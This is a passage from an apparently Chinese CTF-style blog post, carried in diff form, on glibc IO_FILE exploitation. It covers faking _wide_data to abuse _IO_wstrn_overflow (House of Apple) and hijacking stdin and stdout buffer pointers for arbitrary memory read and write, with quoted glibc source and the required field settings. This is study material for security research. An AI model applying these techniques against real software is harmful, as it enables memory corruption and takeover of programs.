  <span class="comment">/* Start of putback+get area. */</span>	 <span class="comment">//0x10</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span>			<span class="comment">//0x18</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span>			<span class="comment">//0x20</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span>				<span class="comment">//0x28</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span>		<span class="comment">//0x30</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span>		<span class="comment">//0x38</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span> <span class="comment">//_IO_wide_data+0xe0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>伪造<code>_wide_data</code>变量，通过<code>_IO_wstrn_overflow</code>可以将已知地址空间上的某些值修改为一个已知值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span> _IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>))); <span class="comment">//overflow_buf+偏移</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_IO_wstrn_overflow</code>首先将<code>fp</code>强制转化为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p>
+<p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p>
+<p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">// 其不为0的时候不要执行到这里</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b; <span class="comment">//overflow_buf</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb; <span class="comment">//overflow_buf+偏移</span></span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样也能写入到<code>f-&gt;_wide_data-&gt;_IO_buf_base</code>和<code>f-&gt;_wide_data-&gt;_IO_buf_end</code></p>
+<p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">char</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_strnfile;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>]; <span class="comment">// overflow_buf相对于_IO_FILE结构体的偏移为0xf0，在vtable后面。</span></span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure>
+
+<p>因此如果能在堆上伪造一个<code>_IO_FILE</code>结构体，将其<code>vtable</code>替换为<code>_IO_wstrn_jumps</code>，伪造<code>_wide_data</code>并覆盖，并伪造其他字段绕过检测调用<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>fake _wide_data</code>至<code>fake _wide_data+0x38</code>的地址区域的内容都替换为<code>fake_IO_FILE的overflow_buf+0xf0</code>或者<code>fake_IO_FILE的overflow_buf + 0x1f0</code>。</p>
+<p>对<code>_wide_data</code>的利用是House of Apple的原理。</p>
+<h3 id="IO-FILE中file的读写指针利用"><a href="#IO-FILE中file的读写指针利用" class="headerlink" title="IO_FILE中file的读写指针利用"></a>IO_FILE中file的读写指针利用</h3><p>由于伪造的vtable常常都不在合法范围之内，因此很难再利用vtable，不过我们还可以利用file。</p>
+<p>IO_FILE结构中包含了关于文件的基本信息，其中就有与文件读写相关的字段，fwrite、fread等操作就需要利用这些信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们能控制以上字段，那就可以控制缓冲区的读写范围，实现任意读写。即使没有打开文件也没有关系，程序本身会创建stdin、stdout、stderr，控制这两个字段后通过sprintf、printf等函数一样可以利用。</p>
+<h4 id="利用stdin进行任意写"><a href="#利用stdin进行任意写" class="headerlink" title="利用stdin进行任意写"></a>利用stdin进行任意写</h4><p><code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走），最后都会调用vtable中的<code>_xsgetn()</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line"> ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">//输入缓冲区为空则初始化输入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) <span class="comment">//还需要get的字节数</span></span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          ...</span><br><span class="line">          <span class="comment">//memcpy</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)  <span class="comment">// 调用__underflow读入数据</span></span><br><span class="line">          ...</span><br><span class="line">        &#125;</span><br><span class="line">      ...</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。</span></span><br><span class="line">  <span class="comment">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 如果输入缓冲区里存在数据，则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>_IO_buf_base</code>为空，则会初始化缓冲区。</p>
+<p>之后会判断<code>_IO_read_ptr</code>对应的空间是否有剩余，如果有则**直接复制到目的地址(传入的data)**。</p>
+<p>如果<code>_IO_read_ptr</code>中的内容没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到从<code>_IO_buf_base</code>开始到<code>_IO_buf_end</code>的位置，默认<code>0x400</code>字节。</p>
+<p>此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将<code>_IO_read_ptr</code>中的数据复制到目的地址(传入的data)。</p>
+<p>综上，为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：</p>
+<ol>
+<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得<code>_IO_read_ptr</code>没有剩余数据，从而可以通过<code>SYS_read</code>读入数据）。</li>
+<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。</li>
+<li> 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。</li>
+<li> 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_ buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</li>
+</ol>
+<h4 id="利用stdout进行任意读-写"><a href="#利用stdout进行任意读-写" class="headerlink" title="利用stdout进行任意读/写"></a>利用stdout进行任意读/写</h4><p><code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走），最后会调用vtable中的<code>_xsputn()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123; <span class="comment">//如果是行缓冲模式...</span></span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="comment">//判断输出缓冲区还有多少空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">          <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>) <span class="comment">//最后一个换行符\n为截断符，且需要刷新输出缓冲区</span></span><br><span class="line">                &#123;</span><br><span class="line">                  count = p - s + <span class="number">1</span>;</span><br><span class="line">                  must_flush = <span class="number">1</span>; <span class="comment">//标志为真：需要刷新输出缓冲区</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="comment">//判断输出缓冲区还有多少空间（全缓冲模式）</span></span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="comment">//输出缓冲区余下空间&gt;0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">      	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); <span class="comment">//全部复制到write_ptr</span></span><br><span class="line">      														<span class="comment">//控制write_ptr实现任意写</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>) <span class="comment">//任意读的利用</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="comment">//调用_IO_OVERFLOW</span></span><br><span class="line">        <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">          count = new_do_write (f, s, do_write);</span><br><span class="line">          to_do -= count;</span><br><span class="line">          <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">            <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。<br>缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中，在建立了输出缓冲区后，会将基址赋值给<code>_IO_write_base</code>。</p>
+<p>若是设置的是<strong>全缓冲模式</strong><code>_IO_FULL_BUF</code>（一次接收所有输入），则会将结束地址给<code>_IO_write_end</code>，若是设置的是<strong>行缓冲模式</strong><code>_IO_LINE_BUF</code>（一次接收一行），则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>。</p>
+<p>此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址，<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。</p>
+<p>（1）任意写</p>
+<p>在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>。</p>
+<p>如果还有空间剩余，则会将要输出的<code>count</code>长度的数据复制到<code>_IO_write_ptr</code>，因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。<br>这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。</p>
+<p>（2）任意读</p>
+<p>任意读利用了<code>if (to_do + must_flush &gt; 0)</code>成立分支的部分</p>
+<p><code>to_do</code>表明还有多少字节没有读入，因此一定是非负数。<code>must_flush</code>表明输出缓冲区是否需要刷新，当在行缓冲模式下检测到有换行符<code>\n</code>的时候被赋值为1，因此当输出内容中有<code>\n</code>且为<strong>行缓冲模式</strong>时就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br>若<code>to_do</code>大于<code>0</code>，也就是还有字符没有读入，也会执行该分支中的内容。因此，当 <strong>输出缓冲区未建立</strong> 或者 <strong>输出缓冲区没有剩余空间</strong> 或者 <strong>输出缓冲区剩余的空间不够一次性将目标地址中的数据完全复制过来</strong> 的时候，也会执行该<code>if</code>分支中的内容。<br><code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span></span><br><span class="line">  <span class="comment">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用_IO_do_write 输出 输出缓冲区</span></span><br><span class="line">  <span class="comment">// 